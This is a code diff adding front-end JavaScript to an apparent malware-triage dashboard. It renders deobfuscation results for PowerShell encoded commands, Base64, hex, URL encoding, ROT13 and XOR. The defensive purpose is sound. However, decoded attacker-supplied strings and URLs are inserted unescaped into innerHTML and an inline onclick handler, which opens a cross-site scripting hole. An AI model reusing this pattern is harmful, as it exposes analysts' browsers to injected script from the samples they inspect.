+        const res = await fetch('/api/deobfuscate', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ payload: payload })
+        });
+
+        if (!res.ok) {
+          const err = await res.json();
+          alert(err.detail || "Deobfuscation failed");
+          return;
+        }
+
+        const data = await res.json();
+        lastDeobfData = data;
+        renderDeobfResults(data);
+      } catch (err) {
+        alert("Deobfuscation error: " + err.message);
+      } finally {
+        btn.disabled = false;
+        btn.innerHTML = oldHtml;
+        lucide.createIcons();
+      }
+    }
+
+    function renderDeobfResults(data) {
+      const container = document.getElementById('deobf-results');
+      container.classList.remove('hidden');
+
+      const cards = [];
+
+      // 1. PowerShell Encoded Command
+      if (data.powershell && data.powershell.length) {
+        data.powershell.forEach((ps, idx) => {
+          const cmdletsHtml = ps.suspicious_cmdlets && ps.suspicious_cmdlets.length
+            ? ps.suspicious_cmdlets.map(c => `<span class="px-1.5 py-0.5 rounded text-[10px] font-bold bg-red-500/20 text-red-400 border border-red-500/30 uppercase">${c}</span>`).join(' ')
+            : `<span class="text-slate-500 text-[11px]">No high-risk cmdlet names detected</span>`;
+
+          const urlsHtml = ps.extracted_urls && ps.extracted_urls.length
+            ? ps.extracted_urls.map(u => `
+                <div class="flex items-center justify-between gap-2 p-1.5 rounded bg-[#090d16] border border-cyber-border">
+                  <span class="text-cyber-cyan truncate text-[11px]">${u}</span>
+                  <button onclick="sendDeobfUrlToTriage('${u}')" class="px-2 py-0.5 rounded text-[10px] font-bold bg-cyber-cyan/15 hover:bg-cyber-cyan/25 text-cyber-cyan border border-cyber-cyan/30 shrink-0">
+                    Triage URL
+                  </button>
+                </div>
+              `).join('')
+            : '';
+
+          cards.push(`
+            <div class="bg-cyber-card border border-rose-500/40 rounded-xl p-5 space-y-3 glow-red">
+              <div class="flex items-center justify-between border-b border-cyber-border/60 pb-2">
+                <span class="text-xs font-bold font-mono text-rose-300 flex items-center gap-1.5 uppercase">
+                  <i data-lucide="terminal" class="w-4 h-4 text-rose-400"></i>
+                  PowerShell -enc Decoded Command (Block #${idx + 1})
+                </span>
+                <span class="px-2 py-0.5 rounded text-[10px] font-mono font-bold bg-rose-500/20 text-rose-300">UTF-16LE Decoded</span>
+              </div>
+              <div class="space-y-1">
+                <div class="text-[10px] font-mono text-slate-400 font-bold uppercase">Detected Dangerous Cmdlets:</div>
+                <div class="flex flex-wrap gap-1.5 items-center">${cmdletsHtml}</div>
+              </div>
+              ${urlsHtml ? `
+                <div class="space-y-1">
+                  <div class="text-[10px] font-mono text-slate-400 font-bold uppercase">Extracted Embedded URLs:</div>
+                  <div class="space-y-1">${urlsHtml}</div>
+                </div>
+              ` : ''}
+              <div class="space-y-1">
+                <div class="text-[10px] font-mono text-slate-400 font-bold uppercase">De-obfuscated Command Output:</div>
+                <textarea readonly class="w-full min-h-[100px] p-2.5 rounded-lg bg-[#070a10] border border-cyber-border text-xs font-mono text-slate-200 focus:outline-none select-all custom-scrollbar">${ps.decoded_command}</textarea>
+              </div>
+            </div>
+          `);
+        });
+      }
+
+      // 2. Base64 Standard
+      if (data.base64_standard) {
+        cards.push(`
+          <div class="bg-cyber-card border border-cyber-border rounded-xl p-5 space-y-3">
+            <div class="flex items-center justify-between border-b border-cyber-border/60 pb-2">
+              <span class="text-xs font-bold font-mono text-white flex items-center gap-1.5 uppercase">
+                <i data-lucide="binary" class="w-4 h-4 text-cyber-cyan"></i>
+                Standard Base64 (ASCII / UTF-8)
+              </span>
+              <span class="px-2 py-0.5 rounded text-[10px] font-mono font-bold bg-cyber-cyan/15 text-cyber-cyan">Decoded</span>
+            </div>
+            <textarea readonly class="w-full min-h-[80px] p-2.5 rounded-lg bg-[#070a10] border border-cyber-border text-xs font-mono text-slate-200 focus:outline-none select-all custom-scrollbar">${data.base64_standard}</textarea>
+          </div>
+        `);
+      }
+
+      // 3. Hex Decoded
+      if (data.hex_decoded) {
+        cards.push(`
+          <div class="bg-cyber-card border border-cyber-border rounded-xl p-5 space-y-3">
+            <div class="flex items-center justify-between border-b border-cyber-border/60 pb-2">
+              <span class="text-xs font-bold font-mono text-white flex items-center gap-1.5 uppercase">
+                <i data-lucide="code" class="w-4 h-4 text-cyber-cyan"></i>
+                Hex Bytes to String Decoded
+              </span>
+              <span class="px-2 py-0.5 rounded text-[10px] font-mono font-bold bg-cyber-cyan/15 text-cyber-cyan">Decoded</span>
+            </div>
+            <textarea readonly class="w-full min-h-[80px] p-2.5 rounded-lg bg-[#070a10] border border-cyber-border text-xs font-mono text-slate-200 focus:outline-none select-all custom-scrollbar">${data.hex_decoded}</textarea>
+          </div>
+        `);
+      }
+
+      // 4. URL Decoded
+      if (data.url_decoded) {
+        cards.push(`
+          <div class="bg-cyber-card border border-cyber-border rounded-xl p-5 space-y-3">
+            <div class="flex items-center justify-between border-b border-cyber-border/60 pb-2">
+              <span class="text-xs font-bold font-mono text-white flex items-center gap-1.5 uppercase">
+                <i data-lucide="link-2" class="w-4 h-4 text-cyber-cyan"></i>
+                URL Percent-Encoding Decoded (Multi-Pass)
+              </span>
+              <span class="px-2 py-0.5 rounded text-[10px] font-mono font-bold bg-cyber-cyan/15 text-cyber-cyan">Unquoted</span>
+            </div>
+            <textarea readonly class="w-full min-h-[80px] p-2.5 rounded-lg bg-[#070a10] border border-cyber-border text-xs font-mono text-slate-200 focus:outline-none select-all custom-scrollbar">${data.url_decoded}</textarea>
+          </div>
+        `);
+      }
+
+      // 5. ROT13 & Reversed
+      if (data.rot13 || data.reversed) {
+        cards.push(`
+          <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+            ${data.rot13 ? `
+              <div class="bg-cyber-card border border-cyber-border rounded-xl p-4 space-y-2">
+                <div class="text-xs font-mono font-bold text-white uppercase flex items-center gap-1.5">
+                  <i data-lucide="refresh-cw" class="w-3.5 h-3.5 text-cyber-cyan"></i> ROT13 Caesar Substitution
+                </div>
+                <textarea readonly class="w-full min-h-[60px] p-2 rounded bg-[#070a10] border border-cyber-border text-xs font-mono text-slate-200 focus:outline-none select-all custom-scrollbar">${data.rot13}</textarea>
+              </div>
+            ` : ''}
+            ${data.reversed ? `
+              <div class="bg-cyber-card border border-cyber-border rounded-xl p-4 space-y-2">
+                <div class="text-xs font-mono font-bold text-white uppercase flex items-center gap-1.5">
+                  <i data-lucide="arrow-left-right" class="w-3.5 h-3.5 text-cyber-cyan"></i> Reversed String
+                </div>
+                <textarea readonly class="w-full min-h-[60px] p-2 rounded bg-[#070a10] border border-cyber-border text-xs font-mono text-slate-200 focus:outline-none select-all custom-scrollbar">${data.reversed}</textarea>
+              </div>
+            ` : ''}
+          </div>
+        `);
+      }
+
+      // 6. XOR Candidates
+      if (data.xor_candidates && data.xor_candidates.length) {
+        cards.push(`
+          <div class="bg-cyber-card border border-amber-500/30 rounded-xl p-5 space-y-3 glow-amber">
+            <div class="flex items-center justify-between border-b border-cyber-border/60 pb-2">
+              <span class="text-xs font-bold font-mono text-amber-300 flex items-center gap-1.5 uppercase">
+                <i data-lucide="cpu" class="w-4 h-4 text-amber-400"></i>
+                Single-Byte XOR Brute-Force Candidates
+              </span>
+              <span class="px-2 py-0.5 rounded text-[10px] font-mono font-bold bg-amber-500/20 text-amber-300">${data.xor_candidates.length} Hit(s)</span>
+            </div>
+            <div class="space-y-2">
+              ${data.xor_candidates.map(xc => `
+                <div class="p-2.5 rounded bg-[#090d16] border border-cyber-border space-y-1">
+                  <div class="flex items-center justify-between text-xs font-mono">
+                    <span class="text-amber-400 font-bold">Key: ${xc.key}</span>
+                    <span class="text-[10px] text-slate-400">Matches: ${xc.matches.join(', ')}</span>
+                  </div>
+                  <div class="text-xs font-mono text-slate-200 break-all select-all">${xc.preview}</div>
+                </div>
+              `).join('')}
+            </div>
+          </div>
+        `);
+      }
+
+      if (cards.length) {
+        container.innerHTML = cards.join('');
+      } else {
+        container.innerHTML = `
+          <div class="bg-cyber-card border border-cyber-border rounded-xl p-6 text-center text-slate-400 font-mono text-xs">
+            No known obfuscation scheme (PowerShell -enc, Base64, Hex, URL-enc, ROT13, or XOR) detected for this payload.
+          </div>
+        `;
+      }
+
+      lucide.createIcons();
+    }
+
+    function sendDeobfUrlToTriage(url) {
+      if (!url) return;
+      document.getElementById('ioc-input').value = url;
+      switchTab('triage');
+      handleInputDebounce();
+      window.scrollTo({ top: 0, behavior: 'smooth' });
     }
 
     // ==========================================
